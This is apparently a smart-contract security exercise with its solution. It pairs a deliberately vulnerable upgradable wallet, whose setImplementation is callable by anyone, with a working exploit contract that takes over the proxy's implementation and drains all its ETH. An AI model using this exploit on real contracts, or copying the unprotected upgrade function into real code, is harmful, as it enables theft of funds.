/*

This wallet is upgradable. UpgradableWallet fowards all calls to WalletImplementation.

Tasks:
    - Drain all ETH from the wallet
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;


contract UpgradableWallet {
    address public implementation;
    address public owner;

    constructor(address _implementation) {
        implementation = _implementation;
        owner = msg.sender;
    }

    fallback() external payable {
        (bool executed, ) = implementation.delegatecall(msg.data);
        require(executed, "failed");
    }
}

contract WalletImplementation {
    address public implementation;
    address payable public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    receive() external payable {}

    // Anyone can call setImplementation
    function setImplementation(address _implementation) external {
        implementation = _implementation;
    }

    function withdraw() external onlyOwner {
        owner.transfer(address(this).balance);
    }
}


contract UpgradableWalletExploit {
    address public target;

    constructor(address _target) {
        // target is address of UpgradableWallet
        target = _target;
    }

    function _call(bytes memory data) private {
        (bool executed, ) = target.call(data);
        require(executed, "failed");
    }

    // accept ETH from UpgradableWallet
    receive() external payable {}

    function pwn() external {
        // write your code here and anywhere else
        _call(abi.encodeWithSignature("setImplementation(address)", address(this)));
        _call(abi.encodeWithSignature("withdraw()"));
    }

    function withdraw() external {
        // this code is executed inside UpgadableWallet
        // msg.sender = this exploit contract
        // address(this).balance = ETH balance of UpgradableWallet
        payable(msg.sender).transfer(address(this).balance);
    }
}
